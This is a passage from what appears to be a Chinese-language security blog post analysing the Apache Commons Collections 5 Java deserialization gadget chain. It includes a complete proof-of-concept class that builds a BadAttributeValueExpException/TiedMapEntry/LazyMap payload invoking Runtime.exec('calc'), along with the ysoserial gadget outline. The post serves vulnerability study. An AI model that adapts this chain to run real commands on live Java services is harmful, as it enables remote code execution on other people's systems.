+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">HashMap hashMap = new HashMap();
+Map map = LazyMap.decorate(hashMap, chain);
+// map.get(&#34;test&#34;);
+TiedMapEntry key = new TiedMapEntry(map, &#34;key&#34;);
+key.toString();	// toString &gt; getValue() &gt; map.get()
+</code></pre></td></tr></table>
+</div>
+</div><p>接下来就应该去找哪个类会去自动触发<code>toString()</code>，而在jdk内置类中有一个<code>BadAttributeValueExpException</code>异常类，其<code>readObject（）</code>会执行<code>toString()</code>，这样整条链子就齐了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/ba0187ff-e428-8897-0891-687687945f99.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/ba0187ff-e428-8897-0891-687687945f99.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/ba0187ff-e428-8897-0891-687687945f99.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/ba0187ff-e428-8897-0891-687687945f99.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/ba0187ff-e428-8897-0891-687687945f99.png"
+        title="7.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c5791207-f743-442e-a8b4-a76c4d51cd60.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c5791207-f743-442e-a8b4-a76c4d51cd60.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c5791207-f743-442e-a8b4-a76c4d51cd60.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c5791207-f743-442e-a8b4-a76c4d51cd60.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c5791207-f743-442e-a8b4-a76c4d51cd60.png"
+        title="8.png" /></p>
+<p>其中<code>System.getSecurityManager() == null</code>默认成立，因此<code>toString()</code>一定会触发，payload如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">payload</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">InvokerTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">Transformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">ChainedTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">ConstantTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">keyvalue</span><span class="p">.</span><span class="nx">TiedMapEntry</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="kd">map</span><span class="p">.</span><span class="nx">LazyMap</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">management</span><span class="p">.</span><span class="nx">BadAttributeValueExpException</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">Field</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">HashMap</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">Map</span><span class="p">;</span>
+
+<span class="nx">class</span> <span class="nx">CommonsCollections5</span> <span class="p">{</span>
+
+    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">Exception</span> <span class="p">{</span>
+<span class="c1">//        ((Runtime) Runtime.class.getMethod(&#34;getRuntime&#34;).invoke(null)).exec(&#34;calc&#34;);
+</span><span class="c1"></span>        <span class="nx">Transformer</span><span class="p">[]</span> <span class="nx">transformers</span> <span class="p">=</span> <span class="nx">new</span> <span class="nx">Transformer</span><span class="p">[]{</span>
+                <span class="c1">// 传入Runtime类
+</span><span class="c1"></span>                <span class="nx">new</span> <span class="nf">ConstantTransformer</span><span class="p">(</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">class</span><span class="p">),</span>
+                <span class="c1">// 使用Runtime.class.getMethod()反射调用Runtime.getRuntime()
+</span><span class="c1"></span>                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">String</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">Class</span><span class="p">[].</span><span class="nx">class</span><span class="p">},</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[</span><span class="mi">0</span><span class="p">]}),</span>
+                <span class="c1">// invoke()调用Runtime.class.getMethod(&#34;getRuntime&#34;).invoke(null)
+</span><span class="c1"></span>                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">Object</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">Object</span><span class="p">[].</span><span class="nx">class</span><span class="p">},</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[]{</span><span class="nx">null</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]}),</span>
+                <span class="c1">// 调用exec(&#34;calc&#34;)
+</span><span class="c1"></span>                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">String</span><span class="p">.</span><span class="nx">class</span><span class="p">},</span> <span class="nx">new</span> <span class="nx">String</span><span class="p">[]{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span>
+        <span class="p">};</span>
+        <span class="nx">ChainedTransformer</span> <span class="nx">chain</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ChainedTransformer</span><span class="p">(</span><span class="nx">transformers</span><span class="p">);</span>
+<span class="c1">//        chain.transform(null);
+</span><span class="c1"></span>        <span class="nx">HashMap</span> <span class="nx">hashMap</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">HashMap</span><span class="p">();</span>
+        <span class="nx">Map</span> <span class="kd">map</span> <span class="p">=</span> <span class="nx">LazyMap</span><span class="p">.</span><span class="nf">decorate</span><span class="p">(</span><span class="nx">hashMap</span><span class="p">,</span> <span class="nx">chain</span><span class="p">);</span>
+<span class="c1">//        map.get(&#34;asd&#34;);
+</span><span class="c1"></span>        <span class="nx">TiedMapEntry</span> <span class="nx">key</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">TiedMapEntry</span><span class="p">(</span><span class="kd">map</span><span class="p">,</span> <span class="s">&#34;key&#34;</span><span class="p">);</span>
+<span class="c1">//        key.toString();
+</span><span class="c1"></span>
+        <span class="nx">BadAttributeValueExpException</span> <span class="nx">badAttributeValueExpException</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">BadAttributeValueExpException</span><span class="p">(</span><span class="nx">null</span><span class="p">);</span>
+        <span class="nx">Field</span> <span class="nx">field</span> <span class="p">=</span> <span class="nx">badAttributeValueExpException</span><span class="p">.</span><span class="nf">getClass</span><span class="p">().</span><span class="nf">getDeclaredField</span><span class="p">(</span><span class="s">&#34;val&#34;</span><span class="p">);</span>
+        <span class="nx">field</span><span class="p">.</span><span class="nf">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="nx">field</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">badAttributeValueExpException</span><span class="p">,</span> <span class="nx">key</span><span class="p">);</span>
+
+        <span class="kt">byte</span><span class="p">[]</span> <span class="nx">bytes</span> <span class="p">=</span> <span class="nx">Serializables</span><span class="p">.</span><span class="nf">serializeToBytes</span><span class="p">(</span><span class="nx">badAttributeValueExpException</span><span class="p">);</span>
+        <span class="nx">Serializables</span><span class="p">.</span><span class="nf">deserializeFromBytes</span><span class="p">(</span><span class="nx">bytes</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>其中我们用反射的方式构造<code>badAttributeValueExpException</code>对象，因为其构造函数会判断是否为空，如果不为空在序列化时就会执行<code>toString()</code>，那么在执行反序列化时就会导致无法触发漏洞。</p>
+</blockquote>
+<p>ysoserial的gadget如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/*
+	Gadget chain:
+        ObjectInputStream.readObject()
+            BadAttributeValueExpException.readObject()
+                TiedMapEntry.toString()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
+	Requires:
+		commons-collections
+ */
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="参考链接">参考链接</h1>
+<ol>
+<li><a href="https://github.com/Y4er/WebLogic-Shiro-shell" target="_blank" rel="noopener noreffer">https://github.com/Y4er/WebLogic-Shiro-shell</a></li>
+<li><a href="https://www.xmanblog.net/java-deserialize-apache-commons-collections/" target="_blank" rel="noopener noreffer">https://www.xmanblog.net/java-deserialize-apache-commons-collections/</a></li>
+<li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java" target="_blank" rel="noopener noreffer">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java</a></li>
+</ol>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-12-20</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="/apache-commons-collections5/" data-title="Apache Commons Collections5 反序列化漏洞分析" data-via="Da22lec"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="/apache-commons-collections5/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="/apache-commons-collections5/" data-title="Apache Commons Collections5 反序列化漏洞分析"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="/apache-commons-collections5/" data-title="Apache Commons Collections5 反序列化漏洞分析"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="/apache-commons-collections5/" data-title="Apache Commons Collections5 反序列化漏洞分析"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/cve-2021-32682-elfinder-rce/" class="prev" rel="prev" title="CVE-2021-32682 elFinder RCE 简单分析"><i class="fas fa-angle-left fa-fw"></i>CVE-2021-32682 elFinder RCE 简单分析</a>
+            <a href="/cve-2021-38294-apache-storm-nimbus-rce/" class="next" rel="next" title="CVE-2021-38294 Apache Storm Nimbus RCE 简单分析">CVE-2021-38294 Apache Storm Nimbus RCE 简单分析<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{"valine":{"appId":"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI","appKey":"WBmoGyJtbqUswvfLh6L8iEBr","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"你的评论 ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
